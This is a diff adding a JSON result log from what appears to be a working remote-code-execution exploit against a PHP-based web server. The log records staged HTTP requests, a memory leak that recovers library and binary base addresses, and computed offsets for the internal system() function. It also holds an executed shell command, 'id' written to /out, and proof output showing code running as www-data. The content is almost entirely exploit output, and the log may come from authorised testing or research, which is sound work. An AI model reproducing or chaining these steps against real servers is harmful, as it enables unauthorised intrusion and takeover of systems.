@@ -1,0 +1,119 @@
+{
+ "stages": [
+  {
+   "stage": "A1",
+   "rc": 0,
+   "status": "HTTP/1.0 500 Internal Server Error",
+   "bytes": 211,
+   "elapsed": 0.11
+  },
+  {
+   "stage": "B1",
+   "i": 0,
+   "bytes": 1685519,
+   "status": "HTTP/1.1 200 OK",
+   "decoded": 819208,
+   "lib": "0x7fe1d839d000",
+   "cands": {
+    "0x7fe1d6800000": 87,
+    "0x7fe1d5e00000": 79
+   },
+   "main": "0x7fe1d6800000",
+   "leak": "hit",
+   "chosen": true
+  },
+  {
+   "stage": "B1",
+   "i": 1,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 2,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 3,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "B1",
+   "i": 4,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK",
+   "leak": "err:no pointers"
+  },
+  {
+   "stage": "A2",
+   "i": 0,
+   "bytes": 211,
+   "status": "HTTP/1.0 500 Internal Server Error"
+  },
+  {
+   "stage": "B2",
+   "i": 0,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 1,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 2,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 3,
+   "bytes": 259,
+   "status": "HTTP/1.1 200 OK"
+  },
+  {
+   "stage": "B2",
+   "i": 4,
+   "bytes": 0,
+   "status": ""
+  }
+ ],
+ "success": true,
+ "marker": "M84_8424_a",
+ "zif_off": "0x464530",
+ "zdtor_off": "0x65d1e0",
+ "s_off": "0xf8398",
+ "a1": {
+  "bytes": 1060211,
+  "sha256": "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
+ },
+ "b1": {
+  "bytes": 33128677,
+  "sha256": "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
+ },
+ "S": "0x7fe1d68f8398",
+ "zif_system": "0x7fe1d8801530",
+ "main": "0x7fe1d6800000",
+ "lib": "0x7fe1d839d000",
+ "lib_minus_main": "0x1b9d000",
+ "a2": {
+  "bytes": 279369,
+  "sha256": "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236"
+ },
+ "b2": {
+  "bytes": 451384,
+  "cmd": "id>/out/p1_conc_M84_8424_a;echo M84_8424_a>>/out/p1_conc_M84_8424_a;id>&2;echo M84_8424_a>&2",
+  "sha256": "272edd402c8c1ecc551e57513c96ac490641c524636d245e9c8fa94c369559a9"
+ },
+ "proof": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nM84_8424_a\n",
+ "b2_hit": 4
+}
